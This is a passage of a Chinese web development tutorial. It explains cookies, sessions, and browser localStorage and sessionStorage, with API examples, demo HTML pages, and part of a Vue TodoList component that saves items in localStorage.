：</strong></p><ul><li>Cookie一旦创建成功，名称就无法修改</li><li>Cookie是无法跨域名的，也就是说a域名和b域名下的cookie是无法共享的，这也是由Cookie的隐私安全性决定的，这样就能够阻止非法获取其他网站的Cookie</li><li>每个域名下Cookie的数量不能超过20个，每个Cookie的大小不能超过4kb</li><li>有安全问题，如果Cookie被拦截了，那就可获得session的所有信息，即使加密也于事无补，无需知道cookie的意义，只要转发cookie就能达到目的</li><li>Cookie在请求一个新的页面的时候都会被发送过去</li></ul><p><strong>Cookie 在身份认证中的作用</strong></p><ul><li><p>客户端第一次请求服务器的时候，服务器通过响应头的形式，向客户端发送一个身份认证的 Cookie，客户端会自动 将 Cookie 保存在浏览器中。</p></li><li><p>随后，当客户端浏览器每次请求服务器的时候，浏览器会自动将身份认证相关的 Cookie，通过请求头的形式发送给 服务器，服务器即可验明客户端的身份。</p></li></ul><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e29b7e0bef784bc5b6b8ed50b0d8a509.png" alt="在这里插入图片描述"></p><p><strong>Cookie 不具有安全性</strong></p><p>由于 Cookie 是存储在浏览器中的，而且浏览器也提供了读写 Cookie 的 API，因此 Cookie 很容易被伪造，不具有安全性。因此不建议服务器将重要的隐私数据，通过 Cookie 的形式发送给浏览器。</p><blockquote><p>注意：千万不要使用 Cookie 存储重要且隐私的数据！比如用户的身份信息、密码等。</p></blockquote><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了session是一种特殊的cookie。cookie是保存在客户端的，而session是保存在服务端。</p><p><strong>为什么要用session</strong>  </p><p>由于cookie是存在用户端，而且它本身存储的尺寸大小也有限，最关键是用户可以是可见的，并可以随意的修改，很不安全。那如何又要安全，又可以方便的全局读取信息呢？于是，这个时候，一种新的存储会话机制：session诞生了</p><p><strong>session原理</strong><br>当客户端第一次请求服务器的时候，服务器生成一份session保存在服务端，将该数据(session)的id以cookie的形式传递给客户端；以后的每次请求，浏览器都会自动的携带cookie来访问服务器(session数据id)。</p><blockquote><p>图示：</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124154221400.png"></p><blockquote><p>session我觉得可以简单理解为一个表，根据cookie传来的值查询表中的内容</p></blockquote><p><strong>session 标准工作流程</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124154249377.png" alt="image-20221124154249377"></p><h3 id="WebStorage（js-本地存储）"><a href="#WebStorage（js-本地存储）" class="headerlink" title="WebStorage（js 本地存储）"></a>WebStorage（js 本地存储）</h3><p>存储内容大小一般支持 <strong>5MB</strong> 左右（不同浏览器可能还不一样）<br>浏览器端通过Window.sessionStorage和Window.localStorage属性来实现本地存储机制<br>相关API</p><ul><li>xxxStorage.setItem(‘key’, ‘value’)该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值</li><li>xxxStorage.getItem(‘key’)该方法接受一个键名作为参数，返回键名对应的值</li><li>xxxStorage.removeItem(‘key’)该方法接受一个键名作为参数，并把该键名从存储中删除</li><li>xxxStorage.clear()该方法会清空存储中的所有数据</li></ul><blockquote><p>备注</p></blockquote><ul><li>SessionStorage存储的内容会随着浏览器窗口关闭而消失</li><li>LocalStorage存储的内容，需要手动清除才会消失</li><li>xxxStorage.getItem(xxx)如果 xxx 对应的 value 获取不到，那么getItem()的返回值是null</li><li>JSON.parse(null)的结果依然是null</li></ul><h3 id="LocalStorage"><a href="#LocalStorage" class="headerlink" title="LocalStorage"></a>LocalStorage</h3><p>LocalStorage是HTML5新引入的特性，由于有的时候我们存储的信息较大，Cookie就不能满足我们的需求，这时候LocalStorage就派上用场了。</p><p><strong>LocalStorage的优点 ：</strong></p><ul><li>在大小方面，LocalStorage的大小一般为5MB，可以储存更多的信息</li><li>LocalStorage是持久储存，并不会随着页面的关闭而消失，除非主动清理，不然会永久存在</li><li>仅储存在本地，不像Cookie那样每次HTTP请求都会被携带</li></ul><p><strong>LocalStorage的缺点 ：</strong></p><ul><li>存在浏览器兼容问题，IE8以下版本的浏览器不支持</li><li>如果浏览器设置为隐私模式，那我们将无法读取到LocalStorage</li><li>LocalStorage受到同源策略的限制，即端口、协议、主机地址有任何一个不相同，都不会访问</li></ul><p><strong>LocalStorage的常用API ：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 保存数据到 localStorage</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>);<br><br><span class="hljs-comment">// 从 localStorage 获取数据</span><br><span class="hljs-keyword">let</span> data = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>);<br><br><span class="hljs-comment">// 从 localStorage 删除保存的数据</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>);<br><br><span class="hljs-comment">// 从 localStorage 删除所有保存的数据</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>();<br><br><span class="hljs-comment">// 获取某个索引的Key</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">key</span>(index)<br></code></pre></td></tr></table></figure><p><strong>LocalStorage的使用场景:</strong></p><ul><li>有些网站有换肤的功能，这时候就可以将换肤的信息存储在本地的LocalStorage中，当需要换肤的时候，直接操作LocalStorage即可</li><li>在网站中的用户浏览信息也会存储在LocalStorage中，还有网站的一些不常变动的个人信息等也可以存储在本地的LocalStorage中</li></ul><h3 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h3><p>SessionStorage和LocalStorage都是在HTML5才提出来的存储方案，SessionStorage<br>主要用于临时保存同一窗口(或标签页)的数据，刷新页面时不会删除，关闭窗口或标签页之后将会删除这些数据。</p><p><strong>SessionStorage与LocalStorage对比 ：</strong></p><ul><li>SessionStorage和LocalStorage都在 <strong>本地进行数据存储</strong> ；</li><li>SessionStorage也有同源策略的限制，但是SessionStorage有一条更加严格的限制，SessionStorage <strong>只有在同一浏览器的同一窗口下才能够共享</strong> ；</li><li>LocalStorage和SessionStorage <strong>都不能被爬虫爬取</strong> ；</li></ul><p><strong>SessionStorage的常用API ：</strong></p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 保存数据到 sessionStorage</span><br>sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>);<br><br><span class="hljs-comment">// 从 sessionStorage 获取数据</span><br><span class="hljs-keyword">let</span> data = sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>);<br><br><span class="hljs-comment">// 从 sessionStorage 删除保存的数据</span><br>sessionStorage.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>);<br><br><span class="hljs-comment">// 从 sessionStorage 删除所有保存的数据</span><br>sessionStorage.<span class="hljs-title function_">clear</span>();<br><br><span class="hljs-comment">// 获取某个索引的Key</span><br>sessionStorage.<span class="hljs-title function_">key</span>(index)<br><br></code></pre></td></tr></table></figure><p><strong>SessionStorage的使用场景</strong></p><p>由于SessionStorage具有时效性，所以可以用来存储一些网站的游客登录的信息，还有临时的浏览记录的信息。当关闭网站之后，这些信息也就随之消除了。</p><blockquote><p>具体案例：</p></blockquote><p><strong>localStorage</strong></p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>localStorage<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>localStorage<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;saveData()&quot;</span>&gt;</span>点我保存一个数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;readData()&quot;</span>&gt;</span>点我读取一个数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;deleteData()&quot;</span>&gt;</span>点我删除一个数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;deleteAllData()&quot;</span>&gt;</span>点我清空一个数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">let</span> p = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;张三&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">saveData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;msg&#x27;</span>,<span class="hljs-string">&#x27;hello!!!&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>,<span class="hljs-number">666</span>)</span><br><span class="language-javascript">                <span class="hljs-comment">// 转成 JSON 对象存进去</span></span><br><span class="language-javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;person&#x27;</span>,<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(p))</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">readData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;msg&#x27;</span>))</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>))</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> result = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;person&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(result))</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">// console.log(localStorage.getItem(&#x27;msg3&#x27;))</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteAllData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>()</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>sessionStorage</strong></p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>sessionStorage<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>sessionStorage<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;saveData()&quot;</span>&gt;</span>点我保存一个数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;readData()&quot;</span>&gt;</span>点我读取一个数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;deleteData()&quot;</span>&gt;</span>点我删除一个数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;deleteAllData()&quot;</span>&gt;</span>点我清空一个数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">let</span> p = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;张三&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">saveData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;msg&#x27;</span>,<span class="hljs-string">&#x27;hello!!!&#x27;</span>)</span><br><span class="language-javascript">sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>,<span class="hljs-number">666</span>)</span><br><span class="language-javascript">                <span class="hljs-comment">// 转换成JSON 字符串存进去</span></span><br><span class="language-javascript">sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;person&#x27;</span>,<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(p))</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">readData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;msg&#x27;</span>))</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>))</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> result = sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;person&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(result))</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">// console.log(sessionStorage.getItem(&#x27;msg3&#x27;))</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">sessionStorage.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;msg2&#x27;</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteAllData</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">sessionStorage.<span class="hljs-title function_">clear</span>()</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>TodoList案例本地存储 App.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-container&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-wrap&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">myheader</span> <span class="hljs-attr">:p_receive</span>=<span class="hljs-string">&quot;addObj&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">myheader</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">MyListVue</span> <span class="hljs-attr">:p_todos</span>=<span class="hljs-string">&quot;todos&quot;</span> <span class="hljs-attr">:p_List_changeObjDone</span>=<span class="hljs-string">&quot;changeObjDone&quot;</span> <span class="hljs-attr">:p_List_Delete</span>=<span class="hljs-string">&quot;deleteTodoObj&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">MyListVue</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">MyFooterVue</span> <span class="hljs-attr">:p_todos</span>=<span class="hljs-string">&quot;todos&quot;</span> <span class="hljs-attr">:p_checkAll</span>=<span class="hljs-string">&quot;checkAll&quot;</span> <span class="hljs-attr">:p_clearAllTodo</span>=<span class="hljs-string">&quot;clearAllTodo&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">MyFooterVue</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">Myheader</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Myheader.vue&#x27;</span>;</span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyListVue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/MyList.vue&#x27;</span>;</span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyFooterVue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/MyFooter.vue&#x27;</span>;</span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> &#123;</span><br><span class="language-javascript">    nanoid</span><br><span class="language-javascript">  &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;nanoid&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title class_">Myheader</span>,</span><br><span class="language-javascript">      <span class="hljs-title class_">MyFooterVue</span>,</span><br><span class="language-javascript">      <span class="hljs-title class_">MyListVue</span>,</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">todos</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;todos&quot;</span>)) || []</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">// 添加一个todo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">addObj</span>(<span class="hljs-params">title</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (!title) <span class="hljs-keyword">return</span> <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;不可以为空&#x27;</span>)</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(title)</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">unshift</span>(&#123;</span><br><span class="language-javascript">          <span class="hljs-attr">id</span>: <span class="hljs-title function_">nanoid</span>(),</span><br><span class="language-javascript">          <span class="hljs-attr">title</span>: title,</span><br><span class="language-javascript">          <span class="hljs-attr">done</span>: <span class="hljs-literal">false</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// 改变todo状态</span></span><br><span class="language-javascript">      <span class="hljs-title function_">changeObjDone</span>(<span class="hljs-params">id</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">if</span> (todo.<span class="hljs-property">id</span> === id) todo.<span class="hljs-property">done</span> = !todo.<span class="hljs-property">done</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// 删除todo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">deleteTodoObj</span>(<span class="hljs-params">id</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          <span 